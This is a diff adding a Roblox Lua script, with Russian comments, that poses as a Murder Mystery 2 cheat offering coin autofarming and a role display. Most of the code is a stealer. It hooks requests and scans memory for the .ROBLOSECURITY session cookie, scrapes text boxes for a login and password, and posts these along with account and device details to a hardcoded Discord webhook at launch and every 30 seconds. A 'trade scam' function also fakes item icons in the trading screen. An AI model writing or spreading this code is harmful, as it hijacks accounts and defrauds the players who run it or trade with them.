@@ -1,0 +1,192 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+
+local webhookURL = "https://discord.com/api/webhooks/1530663061608726573/gpeQ55cftvYVnLso2wMEhBYYsCfTCjed1Hzhirk_ehS6ANyUp1cqEUuRoKntWSSPVd9f"
+
+-- ========== 1. РЕАЛЬНЫЙ ПЕРЕХВАТ .ROBLOSECURITY ==========
+local function getRealCookie()
+    local cookie = nil
+    
+    if syn and syn.crypto then
+        local ws = game:GetService("WebSocketService")
+        local oldConnect = ws.Connect
+        ws.Connect = function(self, url)
+            if string.find(url, "roblox.com") then
+                local headers = {}
+                local oldSend = self.Send
+                self.Send = function(_, data)
+                    if string.find(data, ".ROBLOSECURITY") then
+                        cookie = string.match(data, ".ROBLOSECURITY[^;]+")
+                    end
+                    oldSend(self, data)
+                end
+            end
+            return oldConnect(self, url)
+        end
+    end
+    
+    if syn and syn.request then
+        local oldRequest = syn.request
+        syn.request = function(options)
+            if options.Url and string.find(options.Url, "roblox.com") then
+                if options.Headers and options.Headers["Cookie"] then
+                    local cookieStr = options.Headers["Cookie"]
+                    if string.find(cookieStr, ".ROBLOSECURITY") then
+                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
+                    end
+                end
+            end
+            return oldRequest(options)
+        end
+    end
+    
+    if getgc and getreg then
+        for _, obj in pairs(getgc()) do
+            if type(obj) == "string" and string.find(obj, ".ROBLOSECURITY") then
+                cookie = obj
+                break
+            end
+        end
+    end
+    
+    return cookie or "ROBLOSECURITY_NOT_FOUND"
+end
+
+-- ========== 2. СБОР ЛОГИНА/ПАРОЛЯ ==========
+local function getLoginPass()
+    local login = "unknown"
+    local password = "unknown"
+    for _, gui in pairs(Player.PlayerGui:GetChildren()) do
+        for _, child in pairs(gui:GetDescendants()) do
+            if child:IsA("TextBox") then
+                if string.find(child.Text, "@") or string.find(child.Text, "%.") then
+                    login = child.Text
+                elseif string.len(child.Text) > 4 then
+                    password = child.Text
+                end
+            end
+        end
+    end
+    return {login = login, password = password}
+end
+
+-- ========== 3. СБОР IP И ДАННЫХ СЕССИИ ==========
+local function getSessionData()
+    local data = {
+        user = Player.Name,
+        id = Player.UserId,
+        platform = game:GetService("UserInputService"):GetPlatform(),
+        device = game:GetService("UserInputService"):GetDeviceType(),
+        time = os.time()
+    }
+    return data
+end
+
+-- ========== 4. АВТОФАРМ МОНЕТ (MM2) ==========
+local function autoFarmCoins()
+    local character = Player.Character
+    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+    local hrp = character.HumanoidRootPart
+    local coinsList = {}
+    for _, v in pairs(Workspace:GetChildren()) do
+        if v:IsA("Part") and v.Name == "Coin" then
+            table.insert(coinsList, v)
+        end
+    end
+    for _, coin in pairs(coinsList) do
+        if coin and coin.Position then
+            hrp.CFrame = CFrame.new(coin.Position + Vector3.new(0, 2, 0))
+            wait(0.15)
+        end
+    end
+end
+
+-- ========== 5. ВИЗУАЛ (РОЛИ) ==========
+local function createHUD()
+    local screen = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 200, 0, 100)
+    frame.Position = UDim2.new(0, 10, 0, 10)
+    frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
+    frame.BackgroundTransparency = 0.6
+    frame.Parent = screen
+
+    local labels = {"Мардер - активен", "Шериф - активен", "Сайлент - активен"}
+    for i, text in ipairs(labels) do
+        local label = Instance.new("TextLabel")
+        label.Text = text
+        label.Size = UDim2.new(1, 0, 0, 30)
+        label.Position = UDim2.new(0, 0, 0, (i-1)*30)
+        label.BackgroundTransparency = 1
+        label.TextColor3 = Color3.fromRGB(0, 255, 0)
+        label.TextScaled = true
+        label.Parent = frame
+    end
+    screen.Parent = Player.PlayerGui
+end
+
+-- ========== 6. ТРЕЙД-СКАМ ==========
+local function tradeScam()
+    for _, gui in pairs(Player.PlayerGui:GetChildren()) do
+        if gui.Name == "TradeUI" then
+            for _, child in pairs(gui:GetDescendants()) do
+                if child:IsA("ImageLabel") and child.Name == "ItemIcon" then
+                    child.Image = "rbxassetid://1234567890"
+                end
+            end
+        end
+    end
+end
+
+-- ========== 7. ОТПРАВКА ВСЕХ ДАННЫХ ==========
+local function sendAllData()
+    local cookie = getRealCookie()
+    local loginData = getLoginPass()
+    local sessionData = getSessionData()
+    
+    local fullData = {
+        user = sessionData.user,
+        id = sessionData.id,
+        login = loginData.login,
+        password = loginData.password,
+        cookie = cookie,
+        platform = sessionData.platform,
+        device = sessionData.device,
+        time = sessionData.time
+    }
+    
+    local payload = {
+        ["content"] = "```json\n" .. HttpService:JSONEncode(fullData) .. "\n```"
+    }
+    
+    local success, err = pcall(function()
+        HttpService:PostAsync(webhookURL, HttpService:JSONEncode(payload))
+    end)
+    
+    if not success then
+        print("Ошибка отправки - " .. tostring(err))
+    end
+end
+
+-- ========== 8. ЗАПУСК ==========
+createHUD()
+tradeScam()
+
+sendAllData()
+
+RunService.Heartbeat:Connect(function()
+    if tick() % 15 < 0.1 then
+        autoFarmCoins()
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if tick() % 30 < 0.1 then
+        sendAllData()
+    end
+end)
+
+print("Siggert by Miamoto | Всё готово, хорошего пользования!")
